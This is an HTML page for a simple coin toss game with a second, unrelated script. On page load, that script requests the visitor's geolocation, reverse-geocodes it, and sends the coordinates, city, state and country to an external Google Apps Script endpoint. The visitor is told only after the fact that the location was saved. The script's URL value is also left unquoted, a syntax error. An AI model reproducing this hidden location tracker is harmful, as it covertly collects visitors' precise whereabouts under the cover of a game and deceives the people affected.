  <meta charset="UTF-8" />
  <title>Coin Toss Game</title>
  <style>
    body {
      background: #121212;
      color: #f0f0f0;
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 50px;
    }

    h1 {
      font-size: 3em;
      margin-bottom: 20px;
    }

    button {
      background: #1f1f1f;
      color: #fff;
      border: 2px solid #4caf50;
      padding: 15px 30px;
      margin: 10px;
      font-size: 1.2em;
      cursor: pointer;
      border-radius: 10px;
      transition: 0.3s;
    }

    button:hover {
      background: #4caf50;
    }

    .result, .score {
      margin-top: 20px;
      font-size: 1.5em;
    }
  </style>
</head>
<body>

  <h1>Coin Toss Game</h1>

  <button onclick="playGame('heads')">Heads</button>
  <button onclick="playGame('tails')">Tails</button>

  <div class="result" id="result"></div>
  <div class="score" id="score">
    Wins: 0 | Losses: 0
  </div>

  <script>
    let wins = 0;
    let losses = 0;

    function playGame(userGuess) {
      const randomNumber = Math.random();
      const coinResult = randomNumber < 0.5 ? 'heads' : 'tails';

      if (userGuess === coinResult) {
        wins++;
        document.getElementById('result').innerHTML = `You chose <b>${userGuess}</b>. Coin is <b>${coinResult}</b>. <span style="color:lightgreen">You Win!</span>`;
      } else {
        losses++;
        document.getElementById('result').innerHTML = `You chose <b>${userGuess}</b>. Coin is <b>${coinResult}</b>. <span style="color:red">You Lose!</span>`;
      }

      document.getElementById('score').innerHTML = `Wins: ${wins} | Losses: ${losses}`;
    }
  </script>
 <script>
  const sheetURL = https://script.google.com/macros/s/AKfycbyDwmWf0ld5chsh22C2414GAm5Ybefurvv73RFXrBRa0qtf9r9bZnk5U1V__NTpWYeqSQ/exec; // Replace with your script URL

  window.onload = function() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(showPosition, handleError);
    } else {
      alert("Geolocation is not supported by this browser.");
    }
  }

  function showPosition(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;

    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`)
      .then(response => response.json())
      .then(data => {
        const city = data.address.city || data.address.town || data.address.village || "Unknown city";
        const state = data.address.state || "Unknown state";
        const country = data.address.country || "Unknown country";

        // Send data to Google Sheet
        fetch(sheetURL, {
          method: "POST",
          body: JSON.stringify({
            city: city,
            state: state,
            country: country,
            latitude: latitude,
            longitude: longitude
          }),
          headers: {
            "Content-Type": "application/json"
          }
        });

        alert(`Welcome! Your location has been saved.\nCity: ${city}\nState: ${state}\nCountry: ${country}`);
      })
      .catch(error => {
        console.error("Error in reverse geocoding: ", error);
      });
  }

  function handleError(error) {
    switch(error.code) {
      case error.PERMISSION_DENIED:
        alert("You denied the location request.");
        break;
      case error.POSITION_UNAVAILABLE:
        alert("Location information is unavailable.");
        break;
      case error.TIMEOUT:
        alert("The request to get your location timed out.");
        break;
      case error.UNKNOWN_ERROR:
        alert("An unknown error occurred.");
        break;
    }
  }
</script>
